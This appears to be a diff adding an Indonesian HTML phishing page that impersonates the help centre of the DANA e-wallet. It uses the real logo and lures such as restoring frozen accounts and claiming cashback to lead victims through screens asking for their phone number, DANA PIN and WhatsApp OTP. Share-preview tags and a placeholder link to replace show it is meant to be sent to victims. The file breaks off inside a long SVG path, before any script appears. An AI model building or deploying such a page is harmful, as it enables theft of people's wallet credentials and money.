@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- ✅ JUDUL SITUS -->
+    <title>Pusat Bantuan DANA</title>
+    <meta name="theme-color" content="#0086e6">
+
+    <!-- ✅ META TAG UNTUK SAMBUNGAN SAMBUNGAN (WhatsApp / Telegram / Medsos) -->
+    <meta property="og:title" content="Pusat Bantuan DANA">
+    <meta property="og:description" content="DIANA - DANA Digital Assistant siap bantu kendala akun Anda 24/7">
+    <meta property="og:image" content="https://files.oaiusercontent.com/file-2uT7wJ6eRbN5vY8Z9x2Lp"> <!-- Gambar DIANA -->
+    <meta property="og:url" content="https://nama-akun.github.io/nama-folder/"> <!-- GANTI DENGAN LINK KAMU -->
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = { theme: { extend: { colors: { dana: '#0086e6' } } } }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities { .bg-dana { background-color: #0086e6; } .text-dana { color: #0086e6; } }
+    </style>
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background:#f4f7fa; overflow: hidden; }
+        .max-w-md { max-width: 480px; margin: 0 auto; }
+        .halaman { position: absolute; top: 0; left: 0; width: 100%; height: 100vh; overflow: hidden; }
+        .hilang { display: none !important; }
+
+        /* ✅ BAGIAN ATAS - LATAR BELAKANG GAMBAR BIRU LENGKUNG */
+        .header-3d-wrapper {
+            width: 100%;
+            height: 340px;
+            background: url('https://files.oaiusercontent.com/file-K1u7z9r6xQZ7vY8HwJ3sLp') center/cover no-repeat;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* ✅ NAVIGASI BAWAH BARU - SESUAI GAMBAR */
+        .nav-baru {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            background-color: #ffffff;
+            border-top: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 15px;
+            box-sizing: border-box;
+        }
+        .nav-item {
+            text-align: center;
+            cursor: pointer;
+            flex: 1;
+        }
+        .nav-item svg {
+            width: 24px;
+            height: 24px;
+            margin-bottom: 2px;
+        }
+        .nav-item.aktif { color: #000000; font-weight: bold; }
+        .nav-item.non-aktif { color: #999999; }
+        .nav-item span { font-size: 12px; display: block; }
+        /* TOMBOL PAY TENGAH */
+        .nav-pay {
+            background: linear-gradient(135deg, #0099ff, #007bff);
+            width: 65px;
+            height: 65px;
+            border-radius: 50%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 13px;
+            box-shadow: 0 3px 10px rgba(0, 134, 230, 0.3);
+            margin-top: -20px;
+            border: 4px solid white;
+        }
+        .nav-pay svg { width: 22px; height: 22px; margin-bottom: 1px; }
+
+
+        /* ====================================== */
+        /* ✅ HALAMAN NOMOR - 100% SESUAI GAMBAR */
+        /* ====================================== */
+        #nomor { background-color: #0086e6; color: white; padding: 40px 25px; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; }
+        .logo-dana-tengah { width: 80px; margin-bottom: 40px; margin-top: 20px; }
+        .judul-nomor { font-size: 17px; margin-bottom: 35px; font-weight: normal; }
+        .kotak-input-nomor {
+            width: 100%;
+            background-color: white;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            padding: 12px 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        .bendera-id { width: 22px; height: 15px; margin-right: 10px; }
+        .kode-negara { color: #333; font-weight: bold; margin-right: 8px; font-size: 16px; }
+        .input-nomor { flex: 1; border: none; outline: none; font-size: 16px; color: #333; background: transparent; }
+        .teks-syarat { font-size: 13px; text-align: center; line-height: 1.5; margin-bottom: 60px; opacity: 0.9; }
+        .teks-syarat a { color: white; text-decoration: underline; font-weight: 500; }
+        .tombol-lanjut-nomor {
+            position: absolute;
+            bottom: 50px;
+            color: white;
+            font-size: 17px;
+            font-weight: 500;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+        }
+
+        /* ✅ ANIMASI LOADING DANA */
+        .loading-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: #0086e6;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+        }
+        .logo-loading { width: 70px; margin-bottom: 20px; position: relative; }
+        .cincin-loading {
+            position: absolute;
+            width: 90px; height: 90px;
+            border: 3px solid transparent;
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: putar 1s linear infinite;
+        }
+        @keyframes putar { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+
+        /* ====================================== */
+        /* ✅ HALAMAN PIN - 100% SESUAI GAMBAR */
+        /* ====================================== */
+        #pin { background-color: #0086e6; color: white; padding: 30px 25px; }
+        .tombol-kembali { position: absolute; top: 20px; left: 20px; color: white; font-size: 22px; text-decoration: none; }
+        .logo-pin-tengah { width: 70px; display: block; margin: 0 auto 30px auto; }
+        .judul-pin { text-align: center; font-size: 17px; margin-bottom: 40px; font-weight: normal; }
+        .kotak-pin-baris { display: flex; justify-content: center; gap: 12px; margin-bottom: 25px; }
+        .kotak-pin {
+            width: 50px; height: 55px;
+            background-color: white;
+            border-radius: 8px;
+            position: relative;
+        }
+        .kotak-pin.aktif::after {
+            content: '';
+            position: absolute;
+            left: 50%; top: 12px;
+            width: 2px; height: 20px;
+            background-color: #999;
+            animation: kedip 1s infinite;
+        }
+        @keyframes kedip { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+        .tombol-tampilkan {
+            display: block;
+            margin: 0 auto 30px auto;
+            background-color: transparent;
+            border: 1px solid white;
+            color: white;
+            padding: 6px 18px;
+            border-radius: 20px;
+            font-size: 14px;
+        }
+        .lupa-pin { text-align: center; font-size: 15px; color: white; opacity: 0.9; margin-bottom: 60px; }
+        .ikon-bawah-pin {
+            position: absolute;
+            bottom: 40px; left: 50%; transform: translateX(-50%);
+            width: 50px; height: 50px;
+            background-color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .ikon-bawah-pin svg { width: 24px; height: 24px; fill: #0086e6; }
+
+        /* KEYBOARD PIN */
+        .keyboard-pin {
+            position: absolute;
+            bottom: 80px;
+            width: 100%;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            padding: 0 40px;
+        }
+        .tombol-angka {
+            width: 60px; height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            color: white;
+            cursor: pointer;
+            border: none;
+            background: transparent;
+            margin: 0 auto;
+        }
+        .tombol-angka:active { background-color: rgba(255,255,255,0.15); }
+
+
+        /* ====================================== */
+        /* ✅ HALAMAN OTP - 100% SESUAI GAMBAR */
+        /* ====================================== */
+        #otp { background-color: white; color: #333; }
+        .header-otp { background-color: #0086e6; color: white; padding: 15px 20px; position: relative; text-align: center; font-weight: 500; font-size: 17px; }
+        .kembali-otp { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: white; font-size: 20px; text-decoration: none; }
+        .isi-otp { padding: 30px 25px; }
+        .teks-atas-otp { font-size: 15px; margin-bottom: 15px; color: #333; }
+        .kotak-nomor-otp {
+            display: flex;
+            align-items: center;
+            background-color: #f1f1f1;
+            border-radius: 8px;
+            padding: 10px 12px;
+            margin-bottom: 8px;
+        }
+        .via-wa { font-size: 13px; color: #666; margin-bottom: 30px; margin-left: 32px; display: flex; align-items: center; gap: 5px; }
+        .kotak-otp-baris { display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; }
+        .kotak-otp {
+            width: 45px; height: 50px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            text-align: center;
+            font-size: 20px;
+            outline: none;
+        }
+        .kotak-otp.aktif { border-color: #0086e6; }
+        .nomor-tidak-aktif { text-align: center; font-size: 14px; color: #0086e6; margin-bottom: 25px; cursor: pointer; }
+        .kotak-kirim-ulang { display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .tombol-kirim-ulang {
+            background-color: #eee;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 6px;
+            color: #999;
+            font-size: 14px;
+        }
+        .timer-otp {
+            background-color: #eee;
+            width: 35px; height: 35px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="max-w-md mx-auto relative" style="height:100vh;">
+
+        <!-- ============= HALAMAN UTAMA ============= -->
+        <div id="utama" class="halaman bg-dana">
+            <!-- ✅ BAGIAN ATAS DENGAN GAMBAR BIRU -->
+            <div class="header-3d-wrapper"></div>
+
+            <div class="absolute bottom-0 w-full bg-white rounded-t-3xl px-6 pt-8 pb-20">
+                <p class="text-center text-gray-400 text-sm">PUSAT BANTUAN</p>
+                <h2 class="text-center text-dana font-bold text-lg mb-6">INPUT SESUAI KENDALA ANDA</h2>
+
+                <!-- ✅ TOMBOL BERFUNGSI KE HALAMAN NOMOR -->
+                <button onclick="ganti('nomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold mb-3 shadow-md">PULIHKAN AKUN DI BEKUKAN</button>
+                <button onclick="ganti('nomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold mb-3 shadow-md">KLAIM VOCER CASHBACK DANA</button>
+                <button onclick="ganti('nomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold mb-3 shadow-md">PEMBATALAN DANA CICIL</button>
+                <button onclick="ganti('nomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold mb-3 shadow-md">LAPORAN KENDALA AKUN</button>
+                <button onclick="ganti('nomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold shadow-md">KENDALA LAINNYA</button>
+            </div>
+
+            <!-- ✅ NAVIGASI BAWAH BARU -->
+            <div class="nav-baru">
+                <div onclick="ganti('utama')" class="nav-item aktif">
+                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                    <span>Beranda</span>
+                </div>
+                <div onclick="ganti('nomor')" class="nav-item non-aktif">
+                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
+                    <span>Aktivitas</span>
+                </div>
+                <div onclick="ganti('nomor')" class="nav-pay">
+                    <svg viewBox="0 0 24 24" fill="white"><path d="M3 3h8v8H3V3zm2 2h4v4H5V5zm8-2h8v8h-8V3zm2 2h4v4h-4V5zM3 13h8v8H3v-8zm2 2h4v4H5v-4zm8-2h8v8h-8v-8zm2 2h4v4h-4v-4z"/></svg>
+                    PAY
+                </div>
+                <div onclick="ganti('nomor')" class="nav-item non-aktif">
+                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.1 0-2-.9-2-2v-1h18zm-9-9c1.66 0 3-1.34 3-3S13.66 3 12 3 9 4.34 9 6s1.34 3 3 3zm6 0c1.66 0 3-1.34 3-3S19.66 3 18 3s-3 1.34-3 3 1.34 3 3 3zm-6 2c-2.33 0-7 1.17-7 3.5V19h14v-4.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
+                    <span>Dompet</span>
+                </div>
+                <div onclick="ganti('nomor')" class="nav-item non-aktif">
+                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                    <span>Saya</span>
+                </div>
+            </div>
+        </div>
+
+
+        <!-- ============= HALAMAN NOMOR ============= -->
+        <div id="nomor" class="halaman hilang">
+            <img src="https://dana.id/assets/images/dana-logo-white.svg" alt="Logo DANA" class="logo-dana-tengah">
+            <p class="judul-nomor">Masukkan nomor HP kamu untuk lanjut</p>
+
+            <div class="kotak-input-nomor">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9b/Flag_of_Indonesia.svg/22px-Flag_of_Indonesia.svg.png" alt="ID" class="bendera-id">
+                <span class="kode-negara">+62</span>
+                <input type="tel" id="inpNomor" class="input-nomor" placeholder="8xxxxxxxxxx" inputmode="numeric">
+            </div>
+
+            <p class="teks-syarat">
+                Dengan melanjutkan, kamu setuju dengan <a href="#">Syarat & Ketentuan</a> dan <a href="#">Kebijakan Privasi</a> kami
+            </p>
+
+            <button class="tombol-lanjut-nomor" onclick="prosesNomor()">LANJUT</button>
+        </div>
+
+
+        <!-- ✅ ANIMASI LOADING -->
+        <div id="loading" class="loading-overlay hilang">
+            <div style="position: relative;">
+                <div class="cincin-loading"></div>
+                <img src="https://dana.id/assets/images/dana-logo-white.svg" alt="Loading" class="logo-loading">
+            </div>
+        </div>
+
+
+        <!-- ============= HALAMAN PIN ============= -->
+        <div id="pin" class="halaman hilang">
+            <a onclick="ganti('nomor')" class="tombol-kembali">←</a>
+            <img src="https://dana.id/assets/images/dana-logo-white.svg" alt="DANA" class="logo-pin-tengah">
+            <p class="judul-pin">Masukkan PIN DANA</p>
+
+            <div class="kotak-pin-baris" id="kotakPin">
+                <div class="kotak-pin aktif"></div>
+                <div class="kotak-pin"></div>
+                <div class="kotak-pin"></div>
+                <div class="kotak-pin"></div>
+                <div class="kotak-pin"></div>
+                <div class="kotak-pin"></div>
+            </div>
+
+            <button class="tombol-tampilkan">TAMPILKAN</button>
+            <p class="lupa-pin">LUPA PIN?</p>
+
+            <div class="ikon-bawah-pin">
+                <svg viewBox="0 0 24 24"><path d="M17 3H7c-1.1 0-1.99.9-1.99 2L3 19c0 1.1.89 2 1.99 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H7V5h10v14zm-4-6h-2v-2h2v2zm0-4h-2V7h2v2z"/></svg>
+            </div>
+
+            <!-- KEYBOARD ANGKA -->
+            <div class="keyboard-pin">
+                <button class="tombol-angka" data-n="1">1</button>
+                <button class="tombol-angka" data-n="2">2</button>
+                <button class="tombol-angka" data-n="3">3</button>
+                <button class="tombol-angka" data-n="4">4</button>
+                <button class="tombol-angka" data-n="5">5</button>
+                <button class="tombol-angka" data-n="6">6</button>
+                <button class="tombol-angka" data-n="7">7</button>
+                <button class="tombol-angka" data-n="8">8</button>
+                <button class="tombol-angka" data-n="9">9</button>
+                <div></div>
+                <button class="tombol-angka" data-n="0">0</button>
+                <button class="tombol-angka" id="hapusPin">⌫</button>
+            </div>
+        </div>
+
+
+        <!-- ============= HALAMAN OTP ============= -->
+        <div id="otp" class="halaman hilang">
+            <div class="header-otp">
+                <a onclick="ganti('pin')" class="kembali-otp">←</a>
+                Masukkan PIN
+            </div>
+
+            <div class="isi-otp">
+                <p class="teks-atas-otp">Kode OTP telah terkirim ke</p>
+
+                <div class="kotak-nomor-otp">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9b/Flag_of_Indonesia.svg/22px-Flag_of_Indonesia.svg.png" alt="ID" class="bendera-id">
+                    <span class="kode-negara text-dana">+62</span>
+                    <span id="noOtp" class="text-dana font-medium"></span>
+                </div>
+
+                <p class="via-wa">
+                    <svg width="16" height="16" fill="#25D366" viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12c0 2.121.56 4.13 1.54 5.88L.05 23.6l5.8-1.52C7.52 22.44 9.44 23 11.47 23 18.1 23 24 17.03 24 10.5S17.1 0 12 0zm6.32 16.94c-.27.76-1.36 1.4-2.23 1.58-.6.12-1.38.22-4-.86-3.35-1.4-5.52-4.76-5.7-5-.18-.24-1.36-1.8-1.36-3.44 0-1.64.86-2.44 1.16-2.78.27-.3.72-.44 1.14-.44.14 0 .28 0 .4.01.42.02.85.1 1.26.2.38.1.74.32 1 .6.34.38.66.98.98 1.5.28.48.54.98.78 1.48.22.44.44.9.62 1.36.2.48.38.98.52 1.48.16.54.3 1.1.4 1.66.12.64.02 1.18-.3 1.6-.34.46-.7.82-1.08 1.14-.38.34-.82.68-1.28 1-.44.3-.88.64-1.34.94-.48.32-.98.62-1.5.86-.5.24-.98.42-1.44.58-.46.14-.9.26-1.3.34-.4.08-.76.14-1.08.18-.68.08-1.3.04-1.84-.1-.52-.14-.94-.34-1.24-.58-.3-.24-.5-.54-.6-.88-.12-.34-.14-.7-.04-1.06.1-.34.3-.64.58-.9.3-.28.64-.5 1.02-.7.4-.2.84-.36 1.3-.5.48-.14.98-.24 1.5-.3.54-.08 1.1-.1 1.66-.06.54.04 1.1.14 1.66.26.54.12 1.1.28 1.64.48.54.2 1.06.44 1.54.72.5.28.94.6 1.3.96.38.38.7.82.96 1.3.26.5.44 1.04.54 1.6.1.54.1 1.1-.04 1.6-.14.5-.3 1-.9-.58 1.54-.32.64-.72 1.24-1.2 1.74-.5.54-1.06 1.02-1.7 1.4-.62.36-1.3.64-2 .84-.7.22-1.44.34-2.2.38-.74.04-1.5-.02-2.26-.14-.74-.12-1.48-.32-2.2-.6-.72-.28-1.4-.64-2.04-1.06-.64-.44-1.22-.94-1.74-1.5-.54-.58-1.02-1.2-1.42-1.86-.42-.66-.76-1.38-1-2.14-.24-.76-.4-1.56-.46-2.38-.06-.82-.02-1.64.12-2.44.14-.82.38-1.6.72-2.34.34-.74.76-1.44 1.24-2.08.5-.64 1.08-1.22 1.72-1.74.66-.54 1.38-.98 2.14-1.34.78-.36 1.6-.64 2.44-.84.84-.2 1.7-.3 2.56-.3.84 0 1.68.1 2.5.28.84.18 1.64.44 2.4.76.74.34 1.44.76 2.08 1.24.64.5 1.22 1.08 1.74 1.72.54.66.98 1.38 1.34 2.14.36.78.64 1.6.84 2.44.2.84.3 1.7.3 2.56 0 .86-.1 1.7-.3 2.54-.22.82-.5 1.6-.84 2.34-.34.74-.74 1.44-1.2 2.08-.52.62-1.1 1.2-1.74 1.72-.64.52-1.34.96-2.08 1.34-.74.36-1.54.64-2.36.84-.82.2-1.66.3-2.5.3-.86 0-1.72-.1-2.56-.28-.82-.18-1.62-.44-2.36-.76-.74-.32-1.44-.72-2.06-1.2-.64-.5-1.22-1.08-1.74-1.72
